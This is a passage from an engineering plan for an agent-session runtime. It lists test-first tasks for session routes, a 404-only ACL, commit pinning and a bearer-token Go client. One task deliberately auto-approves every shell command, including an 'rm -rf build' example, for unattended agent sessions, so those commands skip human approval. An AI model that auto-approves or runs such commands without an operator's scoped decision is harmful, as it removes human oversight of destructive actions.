| `it('rejects a mode outside the SessionCommand union')` | `mode: 'agent'` | `400` with the existing message `"mode must be 'do' or 'plan'"` — **assert the exact existing message**, so this route does not drift from the human one |
| `it('rejects both branch and commitSha — they are mutually exclusive')` | both | `400` |
| `it('rejects a commitSha with no baseBranch to diff against')` | `commitSha` only | `400` |
| `it('rejects a commitSha that is not a hex sha')` | `commitSha: 'not-a-sha'` | `400` |
| `it('rejects a name over SESSION_NAME_MAX_LENGTH rather than truncating it')` | 51-char name | `400`, message from `SESSION_NAME_INVALID_MESSAGES['too-long']` |
| `it('rejects a profile with no correlation — a session whose events go nowhere is a bug')` | `profile` without `correlation` | `400` |
| `it('accepts a correlation with a stage it has never heard of')` | `stage: 'deploy-fix'` | **`201`.** The runtime is a courier (§A.2.1's courier rule): it must not validate `stage` values. An earlier draft required a `400` here, which contradicted this file's own `it('stores correlation verbatim without reading it')` two rows down and would have made a fourth stage an SDK release. The stage-value check lives in the consumer (Task 3.1) |
| `it('rejects a correlation that is not a flat object of non-empty strings')` | `{applicationId: 'a', cycleId: 'c', stage: {nested: 1}}`, and a 2 KB value | `400` for both. Shape and size only — that is the whole of the runtime's interest in `correlation` |
| `it('ignores unknown fields rather than rejecting them')` | valid body + `{futureField: 1}` | `201`. **This is what makes independent deploys survivable (§Section A preamble)** |
| `it('tolerates a null body')` | `payload: null` | `400`, not `500` — the `body ?? {}` guard at `sessions.ts:242-244` exists for exactly this |
| `it('stamps application sdlc so the session is invisible to the human list')` | valid body | **the session as read back from the store** has `application === 'sdlc'`. Assert against the persisted record, not the response body: `application` survives today only because the runtime's `SessionManager` has no `application` of its own (§0.1.d(2)), and **this test is the only thing that catches it if someone adds one.** It is the single most load-bearing test in Phase 2, because a silent failure here disables the entire ACL |
| `it('does not call loadSystemPrompt when instructions are supplied')` | valid body with `instructions` | the prompt-loader double was not called, and the engine received the supplied `instructions` |
| `it('falls back to its own default model and emits a progress event when the requested model is unknown')` | `model: 'us.anthropic.nonexistent-v9'` | the session runs; a `progress` event was emitted mentioning the fallback; the completion payload's `model` is the default. **The visible fallback is the requirement (§A.2.1) — a silent one means CC believes it is running one model while another is billed** |
| `it('stores correlation verbatim without reading it')` | `correlation` with an extra unknown key | the stored correlation deep-equals the input **including the unknown key**. This is the boundary assertion: the runtime is a courier |
| `it('acquires the GitHub credential before persisting the session')` | valid body with a GitHub `repoUrl` | `tokenManager.acquire` called with the **extracted repo name**, and called **before** `manager.create`. Mirrors `sessions.ts:301-305`. **Without this the session has no credential and nothing fails until the agent pushes** (§A.2.1) |
| `it('refuses to build the route without a tokenManager')` | construct `registerSdlcRoutes` with no `tokenManager` | throws at registration. The parameter is **not optional** on the SDLC route, unlike `sessions.ts:177` — an SDLC session exists to push |
| `it('releases the credential when the clone fails')` | clone throws | `release` called with the same repo name; the session deleted; `400`. The post-acquire failure arm, per `sessions.ts:326-334` |
| `it('returns 503, not 500, when acquiring the credential fails')` | `acquire` throws | `503`, and **no session persisted.** A transient Secrets Manager failure must be retryable by CC (§A.2.5), and a credential-less session must never exist |

**Acceptance:** `pnpm build && pnpm --filter @nevado/runtime test` passes.

**Commit (in `nevado-sherpa-tui`):** `feat: add SDLC session create route with correlation and profile`

### Task 2.2b — the read and cancel routes

**A missing task in the earlier draft, and Phase 2 could not have passed its own exit criterion without it.** Phase 2's stated goal is *"CC polls `GET /sessions/{id}`"*; Task 2.6's client exports `getSession` and `cancelSession`; Task 2.9's smoke script polls `GET`; and Task 2.4's ACL tests assume both endpoints exist under the prefix. **No task built them.** §A.2.2 and §A.2.3 specify both normatively.

Numbered `2.2b` rather than renumbering Phase 2, because Part 2 is written against these task numbers.

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/routes/sdlc.ts` (MOD)
- `apps/runtime/src/routes/sdlc.test.ts` (MOD)

**Both are small.** The human-surface equivalents are `GET /sessions/:id` at `routes/sessions.ts:389-415` and `POST /sessions/:id/cancel` at `:504`. Reuse them the same way Task 2.2 reuses create — extract, do not fork.

**`GET` — one behaviour to establish before building on it.** The existing handler is a wrapper over `manager.resumeSession`, so **it is a resume, not a pure read**: it can settle the ephemeral clone and mutate session state. Part 2's stall handling calls this endpoint on a cycle that has gone quiet, which is exactly the moment a side effect is least wanted — a "is it still alive?" probe that restarts something would be a very bad surprise.

So this task must **determine, empirically, what `resumeSession` does to a session that is currently running**, and record the answer in §A.2.2. Three outcomes and what each means:

| Finding | Action |
|---|---|
| It is a no-op on a running session (returns the record, settles nothing) | use it as-is; write the finding down so Part 2 can stop worrying |
| It settles or mutates but harmlessly | use it, but **note it in §A.2.2 and in Part 2's stall-handling task**, because "harmless" is a judgement that should be visible |
| It can disturb a running session | **expose a read-only path** — `manager.get(id)` rather than `resumeSession` — for the SDLC route. Do not make the stall probe a resume |

**Do not skip this determination.** It is the difference between a diagnostic and an intervention, and the whole point of §A.2.2 in Part 2's design is that `GET` is the *authoritative* answer to "is this session alive" — an authority that changes the thing it measures is not one.

**`cancel`** is unchanged in mechanism from the human route. Idempotent: cancelling an already-cancelled or completed session succeeds.

**Both routes get the ACL `preHandler` from Task 2.4** — `application === 'sdlc'`, `404` on anything else. Build the routes here; Task 2.4 adds the hook. If Task 2.4 lands first, the hook covers these routes automatically by virtue of the prefix encapsulation, which is the point of putting it there.

**Tests first**, in `apps/runtime/src/routes/sdlc.test.ts`, using the harness from `routes/sessions.test.ts:109-124` and the doubles in `routes/test-fixtures.ts`.

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('returns the session record with the fields the SDLC path depends on')` | an SDLC session with `status`, `command`, `filesModified`, `branch`, `commitSha`, `totalUsage` | `200`; all six present on `.session`. **Assert `command`, not `mode`** — there is no `mode` on `AgentSession` (§A.2.2), and getting this wrong is a whole class of silent `undefined` |
| `it('returns 404 for a session id that was never known')` | random id | `404` with an `{error}` body |
| `it('does not disturb a running session')` | a session the mock worker reports active | the response is `200` and **the settle/resume double was not invoked** — or, if the determination above concluded a resume is unavoidable, assert explicitly what it does. Either way the behaviour is pinned rather than assumed |
| `it('does not return the message transcript')` | a session with messages | `.messages` is absent or empty. §A.2.2: CC wants `session` and never the transcript, and a full transcript on a stall check is a large pointless payload |
| `it('tolerates a session whose response is a tombstone rather than a record')` | the `{status: 'unshared', tombstone}` shape (`sessions.ts:157`) | does not throw; CC's client must not assume a `200` implies `.session` (§A.2.5) |
| `it('cancels a running session')` | active session | `200`; the worker's `cancelSession` was called with the id |
| `it('treats cancelling an already-completed session as success')` | completed session | `200`, not `409` |
| `it('returns 404 when cancelling a session that was never known')` | random id | `404` |

**Acceptance:** `pnpm build && pnpm --filter @nevado/runtime test` passes. Then live, after deploy: `GET /runtime/sessions/<id>` through API Gateway returns the record for a session created by Task 2.2, and `GET` for a made-up id returns `404`.

**Commit (in `nevado-sherpa-tui`):** `feat: add SDLC session read and cancel routes`

### Task 2.3 — `commitSha` checkout and `baseBranch` fetch on create

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/agent/workspace.ts` (MOD)
- `apps/runtime/src/agent/workspace.test.ts` (MOD)
- `apps/runtime/src/routes/sdlc.ts` (MOD)

**Genuinely new work, and Part 2 Phase 6 depends on it.** §0.1.b C23: neither is reachable from `POST /sessions` today. The create handler runs one `git clone --depth 1 [-b branch] -- url dir` (`workspace.ts:33-47`) and never settles; SHA pinning happens only on **resume**, through `EphemeralCloneSettle` (`sherpa-core src/settle-strategy.ts:54-63`); and **there is no base-branch fetch anywhere**, so `git diff origin/<base>...HEAD` cannot work.

Three sub-problems:

**(a) Pin the commit at create time.** The primitive exists — `checkoutCommit(workspacePath, sha)` from `sherpa-core` (`git-checkout.ts:56-66`), which runs `fetch --depth 1 origin -- <sha>` then `reset --hard FETCH_HEAD`. Call it after the clone. **HEAD stays on the cloned branch** (deliberately, `git-checkout.ts:30-32`), so `branch` in the response is real.

**(b) Make a failed pin loud.** `checkoutCommit` **never throws** — it returns `false` on an invalid sha or any git failure and the session proceeds against the branch tip. On a review step that is **silent wrong code**, which is the worst failure mode available here (§A.2.1). On the SDLC path a `false` return must be a `400` at create, with the workspace destroyed and the session deleted — the same cleanup path the clone failure already uses (`sessions.ts:320-334`).

**(c) Fetch the base ref.** A separate shallow clone has only what it fetched. Add a fetch of `baseBranch` so the diff target is present. `--depth 1` on the base is enough for `git diff origin/<base>...HEAD` on the file contents, but **be careful**: with two independent `--depth 1` grafts there may be no merge base, so a three-dot diff can behave unexpectedly. Test what you actually get. If three-dot is unreliable, a two-dot `git diff origin/<base> HEAD` is the honest fallback and QA's instructions should say which one to use. **Do not assume; run it.** `git-checkout.ts:33-35` already documents that ancestry reasoning is unsound over a `--depth 1` graft.

**Tests first.** `apps/runtime/src/agent/workspace.test.ts` (69 lines today — the clearest unit-test exemplar in the repo). These need real temp git repos; that is fine, the existing file already does filesystem work.

| Test name (sentence) | Fixture | Assertion |
|---|---|---|
| `it('checks out the requested commit and leaves HEAD on a branch')` | bare repo with 3 commits; request the middle one | `rev-parse HEAD` is that commit; `rev-parse --abbrev-ref HEAD` is **not** `HEAD` |
| `it('fails loudly when the commit cannot be checked out, rather than serving the branch tip')` | request a sha that does not exist | throws / returns an error; **and assert the working tree is NOT at the branch tip** — that second assertion is the whole point of the test |
| `it('fetches the base branch so a diff against it is possible')` | bare repo with `develop` and a feature commit | after provisioning, `git rev-parse origin/develop` succeeds in the workspace |
| `it('produces a non-empty diff against the fetched base')` | as above | `git diff --name-only origin/develop...HEAD` (or two-dot, per (c)) lists the changed file. **This is the test that tells you which diff form works over two shallow grafts** |
| `it('destroys the workspace and deletes the session when the commit pin fails')` | route-level, bad sha | `400`; `destroyWorkspace` called; `manager.delete` called; **and `tokenManager.release` called with the extracted repo name.** This is a **new** post-acquire failure path — the human route has no `commitSha` arm, so there is no existing cleanup to copy and it is the one an implementer will forget (§A.2.1 requirement 3). A missed release here leaks a self-renewing push credential (§A.2.4a) |

**Acceptance:** `pnpm build && pnpm --filter @nevado/runtime test` passes. Then, manually against a real repo, confirm the diff command that the QA instructions will use actually returns the expected files — and **write the working command into §A.2.1's `baseBranch` row** so Part 2 Phase 6 does not have to rediscover it.

**Commit (in `nevado-sherpa-tui`):** `feat: support commitSha checkout with a fetched base branch`

### Task 2.4 — the ACL and the per-session non-interactive profile

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/routes/sdlc.ts` (MOD — the `preHandler` hook)
- `apps/runtime/src/agent/worker.ts` (MOD — the approval/question/maxTurns branches)
- `apps/runtime/src/routes/sdlc.test.ts`, `apps/runtime/src/agent/worker.test.ts` (MOD)

**Not blocked on anything.** An earlier draft gated this on a BQ4 investigation; BQ4 is resolved and v1's ACL needs **no SDK change** (§0.4 BQ4, §0.1.d(2)).

**⚠ Revision 6: the credential half of this hook moved to Task 1.6.** Under the token the runtime **is** the authenticator, so the hook cannot ship after the namespace it protects — Task 1.6 lands both together, and §A.3's two-credential table is normative for it. **What remains in this task is the session predicate and the profile.**

**Two independent pieces.**

**(a) The ACL — one predicate.** §A.3. A `preHandler` hook **inside the `/v1/sdlc` encapsulation**, which is its own Fastify scope and therefore cannot leak onto `/v1/workspace/*`. On `GET`, `cancel` and `DELETE` it loads the session and requires **`application === 'sdlc'`**. **Anything else is `404`, never `403`** — a `403` makes the endpoint a session-id oracle. **Absent `application` fails closed.** `DELETE` alone continues on an unresolvable id, because release must be idempotent.

**Do not implement a `createdBy` predicate — and it is not "not yet", it is "not at all".** `createdBy` is forced to the constant `'dev-user'` for every session (`session-manager.ts:759`), so the check would partition nothing while looking like a control — the worst available outcome. **The three things that close the question permanently** (§A.3, Task 2.0, BQ3a):

1. The forcing **is not going to be relaxed** — `sherpa-sdk` #226 proposed exactly that and was closed, because `createdBy` backs `renameSession`'s ownership check.
2. **Do not make the label survive by another route.** `SessionManager.save` forces nothing, so writing `session.createdBy` before the `manager.save(session)` the create route already performs would persist it — and would make every SDLC session **un-renameable**.
3. Under one shared bearer token there is **no per-caller signal to partition on**, wherever the value is kept.

**Write that in the hook's comment as a limitation of the design, not as a v2 to-do.** A second machine client gets a second credential.

**Pass a caller label on create and read it nowhere** (Task 2.2): `m2m:bearer` on the token path, `m2m:<CN>` on the certificate path, `m2m:unknown` under `skipAuth`. Resolve it **once, in the hook**, and carry it to the handler — do **not** re-derive it from headers there, because the two credentials do not both leave evidence in the headers and a handler that re-parsed would silently stamp the certificate's answer on a tokened request. The value is discarded by `create`; that is expected.

**(b) The per-session profile** — §A.7. Three small changes in `apps/runtime/src/agent/worker.ts`, none of which needs an SDK change:

| Change | Where | What |
|---|---|---|
| auto-approve | `worker.ts:138-182` (the `approval` callback, rebuilt per `startSession`) | early `return true` for an SDLC session, **before** the settings-store reads at `:148`/`:159`. Emit the same `progress` line the existing auto-approve paths emit (`:150`, `:160`) so the feed shows what was approved. |
| no questions | `worker.ts:185-198` (the `question` callback) | return a fixed non-interactive string immediately. **Do not leave the 30-minute park in place** — `config.approvalTimeoutMs` defaults to 1 800 000 ms, which is longer than the 20-minute stall threshold (`cycleStatuses.js:144`), so a parked question would be declared stalled before it timed out. |
| `maxTurns` | `worker.ts:98-102` (`getConfig`) | return `maxTurns` derived from the session. Today it returns only `contextWindow`, `firecrawlApiKey`, `awsProfile`, so `EngineConfig.maxTurns` is always `undefined` and the engine uses `DEFAULT_MAX_TURNS = 200` (§0.1.b C27). |

The discriminator must be on the **persisted** `AgentSession`, because the callbacks are rebuilt on every resume. `application: 'sdlc'` (§A.8 P1) is the natural one and needs no new field. **Never touch the settings store** — it is process-global and mutable by any caller (§0.1.b C28).

**The tool allowlist** (§A.7.3) is the other half of (b), and **revision 6 settles the decision it left open — in the opposite direction.** The earlier recommendation was to add an allowlist parameter to `buildToolConfig` in the same SDK release as Task 2.1. **There is no SDK release** (BQ3), so:

- **The terminal half IS enforced, and exactly.** The create route validates that `profile.tools` names **exactly one** of the three terminal tools and returns `400` otherwise, and the session's `McpToolProvider` then advertises that one tool and refuses every other name. **Zero is refused because the session would have no way to submit a result; two because the published `kind` would be ambiguous.**
- **The non-terminal half is NOT enforced against 4.0.1**, and must not be written up as though it were. `buildToolConfig` is subtractive over fixed conditions with no allowlist parameter, so `profile.tools` cannot withhold `searchSessions` or `saveLearnedPattern` from a session. **Record it as advisory** (§A.7.3) and, if it becomes a real exposure, the fix is an SDK release taken deliberately — not a comment claiming a filter that does not run.

**Tests first.**

ACL, in `apps/runtime/src/routes/sdlc.test.ts`:

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('reads an SDLC session')` | session with `application: 'sdlc'` | `200` |
| `it('returns 404, not 403, for a human session')` | `application: 'web'` | `404`. **This is the rule the architecture doc calls the most important and the easiest to miss**, and it is the whole of v1's security value: a machine caller cannot read a human transcript. The body must not leak that the session exists |
| `it('returns 404 for a session with no application at all')` | `application` absent | `404`. **Fail closed.** Sessions created before P1 landed have no `application`, and a permissive default would make every one of them machine-readable |
| `it('refuses to cancel a human session')` | `application: 'web'` | `404`, and the worker's `cancelSession` was **not** called |
| `it('refuses to delete a human session')` | `application: 'web'` | `404`, and **`destroyWorkspace` was not called** — a `404` that still tore down a human's clone would be worse than a `200` |
| `it('forces createdBy to the manager userId and discards the caller label')` | create with any `createdBy` in the options | the **persisted** record carries the runtime's own `userId`, not the label. **Assert against the persisted record, not the create argument** — that is the whole point, and an assertion on the argument passes while proving nothing |
| `it('does not partition by createdBy, and says so')` | two SDLC sessions, both necessarily carrying the same forced `createdBy` | **both readable by either caller.** This test documents a permanent property rather than a deferral — there is nothing to invert later, because the field is a constant and the credential carries no per-caller signal (§A.3) |
| `it('rejects a create with no accepted credential')` | omit `Authorization` and the mTLS subject header | `403` with `{"error":"Forbidden"}`, and **the log line carries `bearerPresented: false` and nothing else** — never the token, not a prefix, not a length |
| `it('accepts a valid bearer token and also accepts a client certificate')` | each credential in turn | both admitted. **Parameterise it**, because the failure this guards is a second credential silently disabling the first |
| `it('does not let a rejected bearer token abort a request a certificate would have admitted')` | a wrong `Authorization` **and** a valid subject header | admitted. **This is the mTLS regression the two-credential order exists to prevent** (§A.3) |
| `it('exempts /health by path, not by raw url')` | `GET /sessions?x=/health` with no credential | `403`, **not** `200`. And `GET /health?probe=1` → `200`. Both directions, because the bug was in both |
| `it('does not expose a settings route under the SDLC prefix')` | — | `PUT /settings` under `/v1/sdlc` → `404`. Guards §A.3's last row: a machine caller must not be able to flip the global auto-approve flags for every session on the box |
| `it('does not list sessions at all under the SDLC prefix')` | — | `GET /sessions` under `/v1/sdlc` → `404`. §A.2 defines four endpoints; a list endpoint is a cross-tenant read waiting to happen |

Profile, in `apps/runtime/src/agent/worker.test.ts` (675 lines today):

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('auto-approves every command for an SDLC session without emitting approvalRequired')` | SDLC session, a `runCommand` the default allowlist would reject (e.g. `rm -rf build`) | approval resolved `true`; **no `approvalRequired` message was broadcast** |
| `it('does not auto-approve for a human session when an SDLC session is also running')` | one SDLC session, one human session, `autoApproveAllCommands: false` in settings | the human session's `runCommand` still emits `approvalRequired`. **This is the test that proves the profile is per-session and not a settings flip** |
| `it('answers a question immediately for an SDLC session rather than parking for 30 minutes')` | SDLC session, `question(...)` | resolves synchronously-ish with the non-interactive string; **assert it resolves well inside `approvalTimeoutMs`**, because the failure mode is a 30-minute hang that looks like a stall |
| `it('passes the profile maxTurns through to the engine config')` | profile `maxTurns: 120` | `getConfig(session).maxTurns === 120`; and for a human session it is `undefined` (so the engine's 200 still applies) |
| `it('grants exactly one terminal tool per role')` | each of the three roles | the provider's `listTools()` is a **single-element** list naming that role's tool — **assert the full set, not `toContain`.** This is the only part of §A.7.3 that is actually enforced against 4.0.1 |
| `it('refuses a create whose profile.tools names no terminal tool or two')` | `tools: []`, then `tools: ['submitPlan', 'submitReview']` | `400` each, **naming the count and the offending tools.** A Command Center dispatcher bug, and create time is the only moment it is actionable |
| ~~`it('does not grant askQuestion to any role')`~~, ~~`it('does not grant switchMode, searchSessions, …')`~~ | — | **Struck (revision 6).** `buildToolConfig` cannot withhold them against 4.0.1 (§A.5.4), so these tests would assert a filter that does not run. **Do not write a passing version by asserting on `profile.tools` itself** — that tests the fixture, not the runtime. §A.7.3's exclusions are recorded as intent |
| `it('leaves ctx.question unset so any other path degrades rather than hangs')` | SDLC session | `askQuestion` invoked through a persona path returns the existing `toolError`, not a hang |

**Acceptance:** `pnpm build && pnpm --filter @nevado/runtime test` passes. ~~Plus, live against testing: the second M2M client from Phase 1's N2 reads a session created by the first and gets `404`.~~ **Struck — there is no second M2M client and N2 is deleted.** The live check that replaces it is **Phase 1's N5b**: a wrong token on a non-health route returns `403` from the runtime.

**Commit (in `nevado-sherpa-tui`):** `feat: scope the SDLC surface to sdlc sessions and run them unattended`

### Task 2.5 — bring `DELETE /sessions/{id}` up to the release contract

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/routes/sdlc.ts` (MOD — the SDLC delete route)
- `apps/runtime/src/ws/broadcaster.ts` (MOD — nothing, if `cleanup` is called from the route; read it first)
- `apps/runtime/src/routes/sdlc.test.ts` (MOD)

**The endpoint exists** (`routes/sessions.ts:417-439`) and already cancels, destroys an ephemeral workspace and releases the GitHub token. §A.2.4 lists five deltas. **Fix them on the SDLC route; leave the human route alone** unless a fix is unambiguously a bug fix for it too (idempotency arguably is — decide with whoever owns the runtime, but do not bundle it).

The five, in order of how much they matter:

1. **Idempotency.** A second call is `404` today because of the `manager.get` precheck (`:420-422`); the SDK's own `deleteCore` *is* idempotent (`session-manager.ts:2055`). **The consumer retries**, and a retry turning into a failure is how a supersede silently does not happen (Part 2 `DEP-P1-1`). Absent session ⇒ success.
2. **The resurrection race.** `DELETE` fires the abort and returns without awaiting the unwind, so `manager.delete` (`:437`) runs concurrently with the engine's terminal `store.save`, and `FileSessionStore.save` `unshift`es an absent id (`file-session-store.ts:102`). **Await the cancelled turn before deleting**, or serialise the two some other way. A released session that still exists, holding nothing, then fails the next `GET` confusingly.
3. **The concurrency slot — decided: await the unwind.** `cancelSession` only aborts; the map delete is deliberately deferred to `startSession`'s `finally` (`worker.ts:229-232`), so the slot frees after `DELETE` has already returned `200`. Awaiting the unwind (fix 2) resolves this too, which is why they are one task.

   **Do not take the obvious alternative.** Deleting the `activeSessions` entry inside `cancelSession` is explicitly forbidden by the code: `worker.ts:244-246` reads *"deliberately NOT that method's eager activeAborts delete: here the map is the liveness record behind `isSessionActive` and the capacity accounting, so startSession's `finally` must stay its only owner or a cancel would release a slot the unwinding turn still holds."* That is an implementer's first instinct and it would corrupt capacity accounting.

   Note this matters less than it did now that supersede is **create-then-release** (§A.2.4) — the replacement session is already created before the old one is released, so a slot that frees a second late costs nothing.
4. **`Broadcaster.cleanup` is dead code with zero callers** (`ws/broadcaster.ts:81-84`). Call it. A 50-message buffer per session leaks for the process lifetime and the 5-minute TTL (`:5`) filters reads without evicting. On a runtime that will now create a session per cycle step, this stops being theoretical.
5. **The response code — decided, no work.** Keep `200 {ok: true}`. §A.2.4 explains why: it matches every other route in the service and CC branches on status class, not on the body (§A.2.5). An earlier draft left this open as *"record whichever you pick"*; it is settled. Part 2's `DEP-P1-1` asked for `204` and is being amended.

Also handle: `manager.delete` writes an S3 tombstone **before** dropping the local row and **throws if that write fails** (`session-manager.ts:2058-2060`), and there is no try/catch at `:437`. Add one, and log which half failed — CC's retry-once-then-fail-the-cycle rule depends on the second attempt succeeding, and "release failed" with no detail is unactionable.

**Tests first.**

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('releases a session and destroys its workspace')` | ephemeral session, not running | `200`; `destroyWorkspace` called with the session id; `manager.delete` called |
| `it('is idempotent — a second release is a success, not a 404')` | already-deleted id | `200`. **The consumer retries; this is the one that matters most** |
| `it('cancels a running session and waits for it to unwind before deleting')` | running session | `200`; the abort fired; `manager.delete` called **after** the turn settled — assert the ordering, not just that both happened |
| `it('does not resurrect the session when the cancelled turn saves on its way out')` | running session whose double saves during unwind | after the call, `manager.get(id)` is absent. **This is the race in fix 2 and it is the hardest one to observe in production** |
| `it('frees the concurrency slot before returning')` | worker at capacity | after `DELETE`, `worker.activeCount` has decreased |
| `it('cleans up the broadcaster buffer')` | session with buffered messages | `Broadcaster.cleanup` called (or the buffer is empty) |
| `it('releases the GitHub token even when the workspace destroy fails')` | `destroyWorkspace` throws | `tokenManager.release` **still called**; the response reflects the failure rather than a silent `200` |
| `it('releases the credential for a persistent-workspace session too')` | `workspaceType: 'persistent'` | `destroyWorkspace` not called (correct), **`release` still called.** The two conditions are independent and an implementer folding them into one `if` is the likely mistake |
| `it('surfaces a credential release failure instead of returning a clean 200')` | `tokenManager.release` throws | the response is **not** a bare `200 {ok:true}`; the log line names the repo and the session id. **§A.2.4a: a silent failure here leaks a self-renewing push credential, not a workspace** |
| `it('surfaces a tombstone write failure rather than reporting success')` | `manager.delete` throws | `500` with an `{error}` body naming the tombstone write |
| `it('refuses to release another client's session')` | ACL — covered in Task 2.4 | cross-reference, do not duplicate |

**Acceptance:** `pnpm build && pnpm --filter @nevado/runtime test` passes. Live: create session A, create session B **on the same branch while A is still live** — `201`, because there is no branch collision (§A.2.1); `DELETE` A twice — both `200`; `GET` A — `404`; B still running. That sequence is Phase 2 exit criterion 5 and it is what create-then-release depends on.

**Commit (in `nevado-sherpa-tui`):** `fix: make SDLC session release idempotent and complete`

### Task 2.6 — the Command Center runtime HTTP client

**Files:**
- `backend/common/runtimeClient.js` (NEW)
- `backend/common/package.json` (MOD — add `@aws-sdk/client-secrets-manager`)
- `backend/__tests__/runtimeClient.test.js` (NEW)
- `backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` (MOD — re-export)

**Where this lives: `backend/go/internal/runtimeclient/`, in Go.** Not `backend/common/runtimeClient.js`, which an earlier revision specified. Two reasons (§0.8.9): **two of the three consumers are Go** — the new cycle worker, and `stuckCycleDetector` once its port lands — and **Wave 6 of the migration plan deletes `backend/common/` entirely**, so a new JS module there would be built into a condemned directory. Part 2 §0.2 assumes `agentDrivenOrchestrator/runtimeDispatch.js`; that is superseded.

Exports, matching Part 2's `DEP-P1-1`, `DEP-P1-2` and `DEP-P1-4`:

```go
type Client interface {
    CreateSession(ctx context.Context, spec CreateSpec) (CreateResult, error) // {SessionID, Status, WorkspacePath, Branch}
    GetSession(ctx context.Context, id string) (AgentSession, error)          // the .session field; messages discarded
    CancelSession(ctx context.Context, id string) error
    ReleaseSession(ctx context.Context, id string) error                      // idempotent; retry-once — see below
}
```

**The bearer token makes this simpler still than the mTLS version this task originally specified, which was already simpler than the OAuth one before it** (§0.9.1). No token endpoint, no `expires_in`, no 50-minute refresh, **and no handshake.**

- **The client owns the `/v1/sdlc` prefix**, so `SDLC_RUNTIME_API_BASE` must carry **neither the prefix nor a port**. A base with the prefix requests `/v1/sdlc/v1/sdlc/sessions`; a base with `:8443` dials a listener that does not exist in token mode and fails as a **connection timeout**, which reads as an outage rather than a configuration error.
- **Read the token once, at construction**, from the secret named by `SDLC_AUTH_TOKEN_ARN`, and parse `{"token": "<opaque string>"}`. **The JSON shape is a cross-repository contract** — both sides read the same secret — so a secret holding a bare string is a configuration error to **name explicitly**, because that is the likely operator mistake. `strings.TrimSpace` the value: a shell redirect picking up a trailing newline is the common case, and `Bearer <token>\n` is not the token the runtime holds.
- **Set the header at ONE request chokepoint**, from constants (`"Authorization"`, `"Bearer "`) that a test pins as literals. They are **fixed by the cross-repository contract**, not options — the ALB's rule condition matches the value `Bearer *` **case-sensitively**, so a client that sent `bearer ` would be 403'd by the ALB and never reach the verifier.
- **⚠ REFUSE CONSTRUCTION when no credential is configured.** Not a warning, not a nil-token client that sends no `Authorization` header. **Degrading to an unauthenticated client is the one outcome that must be impossible**, because it produces a caller that reaches a namespace it cannot authenticate to and fails opaquely at the ALB. `New` returns an error naming both credentials.
- **Never send an empty `Authorization`.** A token-less client must set **no header at all** rather than `Authorization: Bearer` with nothing after it — that is a credential shaped like a credential, which is exactly what the ALB's filter admits and the runtime then rejects, turning a configuration error into a 403 that looks like an authorization problem.
- **No env-var fallback for the token.** A `cursorClient.js:49-52`-style local-dev fallback is inappropriate for a credential that grants session creation on an internet-facing listener.
- **Read `SDLC_RUNTIME_CA_ARN` for BOTH credentials, not just for the certificate.** It verifies the **server**, which the token path needs exactly as much. Reading it only alongside a client certificate silently ignores a CA a token-mode deployment had set and verifies against the system roots instead — correct for a publicly-trusted ACM certificate, and wrong the moment it is not, with no symptom until it fails.
- **Return a typed error carrying `Status` and `Retryable`.** Callers branch on it: `404` on `GetSession` means the session is gone (Part 2's stall handling fails the cycle); `5xx` and timeouts mean unknown (**never fail a cycle** — §A.2.5); `400` on create means CC built a bad request and retrying will not help. **`503` is the retryable one to get right** — the runtime returns it when it cannot acquire a repository credential.
- ~~**Distinguish a TLS handshake failure from an HTTP error.**~~ **Struck for the token path** — there is no client-certificate handshake to fail, and therefore no expired-leaf failure mode presenting as a connection error with no status. **Keep the classification for the retained mTLS path**, where an `x509` or `tls.CertificateVerificationError` still means the leaf is expired, revoked or untrusted and **retrying cannot fix it**: a naive "no status ⇒ transient" classifier would retry a dead credential forever.
- **⚠ The token's failure mode is the opposite shape and needs its own log line.** A wrong or rotated token produces a **clean `403` with a status**, which a naive classifier marks non-retryable and correct — but it is indistinguishable from an ACL rejection on the session predicate. **Say "the SDLC credential was rejected" in the log**, because the remedy (re-read the secret; check both sides hold the same version after a rotation, §0.9.1's rotation window) is nothing like the remedy for a `404`.

**`ReleaseSession` gets the retry-once wrapper** (`DEP-P1-1`). Release is synchronous and its failure is not ignorable: a failed `DELETE` leaks a workspace *and* a live GitHub credential (§A.2.4a). **Retry once; if it still fails, return the error** so the caller fails the cycle with that reason.

**Config comes from the handler, not from the package.** `internal/config` (Wave 0, done) is the established place for env loading; the client takes a struct. Match how `internal/ghclient` receives its GitHub App config rather than inventing a pattern.

**Tests first.** `backend/go/internal/runtimeclient/`, split so the credential construction and the request behaviour are separately drivable: `httptest.NewServer` plus a `NewWithHTTPClient` seam for the request tests, and the mTLS construction tested on its own. **Do not reach for a real handshake to test the token path** — there is nothing to hand-shake, and a TLS fixture would test `crypto/tls` rather than this package.

| Test name (sentence) | Input | Assertion |
|---|---|---|
| `it sends Authorization: Bearer <token> on every request` | two calls | the server saw the header on **both**, with the exact value. **Pin the scheme string as a literal** — the ALB matches `Bearer *` case-sensitively, so `bearer ` is a 403 at the ALB that never reaches the verifier |
| `it refuses to construct a client with no credential at all` | empty token, empty cert ARNs | `New` returns an **error**, not a client. **The one outcome that must be impossible is an unauthenticated client** |
| `it sends no Authorization header at all on a certificate-only client` | cert configured, token empty | the header is **absent**, not empty. `Authorization: Bearer` with nothing after it is a credential-shaped request the ALB admits and the runtime then rejects |
| `it trims whitespace from the token` | secret value with a trailing newline | the header carries the trimmed token. **A shell redirect is the common source** and `Bearer <token>\n` is not what the runtime holds |
| `it names the mistake when the secret holds a bare string instead of an object` | `SecretString` = `"abc123"` | the error says the secret is not a JSON object holding a `token` key. **The likely operator mistake, named rather than left to a JSON parse error** |
| `it rejects an empty token in a well-formed secret` | `{"token": "  "}` | error. An empty credential must not become a client |
| `it reads the CA for a token-mode client too` | `CAARN` set, no client certificate | the CA was read and installed. **Reading it only alongside a certificate silently verifies the server against the system roots instead** |
| `it reads no certificate secrets in token mode` | token configured | the cert/key ARNs were **not** fetched. Returned before those reads, so a token-mode deployment needs no certificate configuration at all |
| `it returns a non-retryable error when a certificate-mode server rejects the certificate` | mTLS test server the client cert does not chain to | **not** retryable, message names certificate verification. **Retained for the mTLS path**: a handshake failure arrives with **no HTTP status**, and a classifier treating "no status" as transient retries a dead credential forever |
